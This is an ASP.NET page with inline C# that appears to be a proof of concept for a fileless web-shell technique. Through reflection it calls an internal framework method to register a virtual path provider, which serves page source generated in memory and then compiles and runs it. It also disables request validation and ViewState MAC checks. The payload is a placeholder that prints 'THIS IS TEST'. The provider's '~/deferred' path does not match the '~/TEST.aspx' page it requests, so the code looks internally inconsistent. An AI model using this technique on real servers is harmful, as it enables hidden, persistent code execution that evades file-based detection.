<%@ Page Language="C#" AutoEventWireup="true" validateRequest="false" EnableViewStateMac="false" %>
<%@ Import Namespace="System.Web.Hosting" %>
<%@ Import Namespace="System.Web.Compilation" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Reflection" %>
<%@ Import Namespace="System.Security.Cryptography" %>
<script runat="server">

    public class DeferredPathProvider : VirtualPathProvider
    {
        public DeferredPathProvider() : base()
        {
        }

        public bool IsTargetVirtualPath(string virtualPath)
        {
            string path = VirtualPathUtility.ToAppRelative(virtualPath);
            return path.StartsWith("~/deferred", StringComparison.InvariantCultureIgnoreCase);
        }

        public override VirtualFile GetFile(string virtualPath)
        {
            if (IsTargetVirtualPath(virtualPath))
            {
                return new DeferredVirtualFile(this, virtualPath);
            }
            else
            {
                return Previous.GetFile(virtualPath);
            }
        }

        public override bool FileExists(string virtualPath)
        {
            return IsTargetVirtualPath(virtualPath) ? true : Previous.FileExists(virtualPath);
        }
    }

    public class DeferredVirtualFile : VirtualFile
    {
        DeferredPathProvider provider = null;

        public DeferredVirtualFile(DeferredPathProvider provider, string virtualFile) : base(virtualFile)
        {
            this.provider = provider;
        }

        public override Stream Open()
        {
        Stream stream = new MemoryStream();

        StreamWriter writer = new StreamWriter(stream);
        writer.Write("<%@ Page Language=\"C#\" AutoEventWireup=\"true\" %>\r\n" +
            "<% Response.Write(\"THIS IS TEST\"); %>");
        writer.Flush();
        stream.Seek(0, SeekOrigin.Begin);

        return stream;
        }
    }

    private Page handler = null;
    public void Page_Load()
    {
        DeferredPathProvider provider = new DeferredPathProvider();
        typeof(HostingEnvironment).GetMethod("RegisterVirtualPathProviderInternal",
        BindingFlags.Static | BindingFlags.InvokeMethod | BindingFlags.NonPublic)
        .Invoke(null, new object[] { provider });
        
        handler = (Page) BuildManager.CreateInstanceFromVirtualPath("~/TEST.aspx", typeof(Page));
        handler.ProcessRequest(HttpContext.Current);
    }

    protected override void Render(HtmlTextWriter writer)
    {
    }
</script>